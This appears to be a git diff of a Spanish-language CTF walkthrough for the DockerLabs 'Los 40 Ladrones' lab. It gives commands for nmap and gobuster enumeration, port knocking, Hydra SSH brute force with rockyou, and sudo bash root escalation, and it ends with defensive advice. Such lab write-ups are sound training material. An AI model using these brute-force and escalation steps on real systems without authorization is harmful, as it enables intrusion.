@@ -1,60 +1,183 @@
-# LOS40LADRONES — DockerLabs
+# Los 40 Ladrones — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** firstatack  
+**Fecha de creación:** 04/07/2024  
+**Técnicas:** Nmap · Gobuster · Port Knocking · Hydra · SSH · sudo bash -p
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **LOS40LADRONES** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — defense.txt](#2-enumeración-web--defensetxt)
+3. [Port Knocking — apertura de SSH](#3-port-knocking--apertura-de-ssh)
+4. [Fuerza bruta SSH — Hydra](#4-fuerza-bruta-ssh--hydra)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable
+Desplegamos la máquina vulnerable:
 
-Hacemos un escaneo profundo de la maquina para ver los puertos abiertos.
+```bash
+sudo bash auto_deploy.sh los40ladrones.tar
+```
 
-## 2. Enumeración
+> IP asignada: `172.17.0.2`
 
-Vemos el servidor web que no cuenta con nada interesante.
+Realizamos un escaneo profundo:
 
-Con gobuster buscaremos directorios escondidos en la maquina y nos
-encontramos con un txt.
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
 
-## 3. Explotación
+Resultado inicial:
 
-Vemos que nos dice un supuesto usuario y lo que parecen ser puertos.
+```text
+80/tcp open http
+```
 
-Utilizaremos la herramienta knock para tocar puertos en un orden secreto para
-pedir que el servidor te abra un puerto que antes estaba oculto.
+El servicio SSH no aparece inicialmente.
 
-## 4. Post-explotación
+---
 
-Volvemos a hacer el escaneo de puertos y podemos ver que cuenta con el servicio
-ssh que estaba oculto.
+## 2. Enumeración web — defense.txt
 
-Como tenemos un usuario ahora utilizaremos hydra para hacer un ataque de
-fuerza bruta y ver si encontramos la contraseña
+Accedemos al servidor web y observamos únicamente la página por defecto de Apache.
+
+Enumeramos directorios ocultos:
+
+```bash
+gobuster dir -u http://172.17.0.2 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-x php,html,py,txt -t 100
+```
+
+Encontramos:
+
+```text
+/defense.txt
+```
+
+Contenido:
+
+```text
+Recuerda llama antes de entrar, no seas como toctoc el maleducado
+7000 8000 9000
+busca y llama +54 2933574639
+```
+
+El texto sugiere un mecanismo de **Port Knocking**.
+
+---
+
+## 3. Port Knocking — apertura de SSH
+
+Utilizamos la herramienta `knock` para tocar los puertos en el orden correcto:
+
+```bash
+knock 172.17.0.2 7000 8000 9000
+```
+
+Volvemos a realizar el escaneo:
+
+```bash
+cat Puertos
+```
+
+Ahora observamos:
+
+```text
+22/tcp open ssh
+80/tcp open http
+```
+
+El servicio SSH ha sido desbloqueado.
+
+---
+
+## 4. Fuerza bruta SSH — Hydra
+
+El texto anterior menciona un posible usuario:
+
+```text
+toctoc
+```
+
+Realizamos fuerza bruta con Hydra:
+
+```bash
+hydra -l toctoc -P /usr/share/wordlists/rockyou.txt \
+ssh://172.17.0.2
+```
+
+Resultado:
+
+```text
+login: toctoc
+password: kittycat
+```
+
+Accedemos al sistema:
+
+```bash
+ssh toctoc@172.17.0.2
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Nos conectamos al usuario con la contraseña que ha encontrado.
+Comprobamos privilegios sudo:
 
-Ahora ejecutamos sudo -l para ver si contamos con permisos de ejecución y
-vemos que en el binario bash tenemos permisos así que simplemente es ejecutar
-sudo bash -p y tendremos una consola como root.
+```bash
+sudo -l
+```
 
-## 6. Lección aprendida
+Resultado:
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+```text
+(root) NOPASSWD: /bin/bash
+```
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+Escalamos privilegios:
+
+```bash
+sudo bash -p
+```
+
+Verificamos acceso:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Port Knocking predecible | Apertura del servicio SSH |
+| Contraseña débil SSH | Acceso remoto |
+| sudo NOPASSWD sobre bash | Escalada inmediata a root |
+
+**Para defenderse:**
+
+- Utilizar secuencias de port knocking más robustas.
+- Aplicar políticas de contraseñas seguras.
+- Restringir accesos sudo innecesarios.
+- Evitar permisos directos sobre bash.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
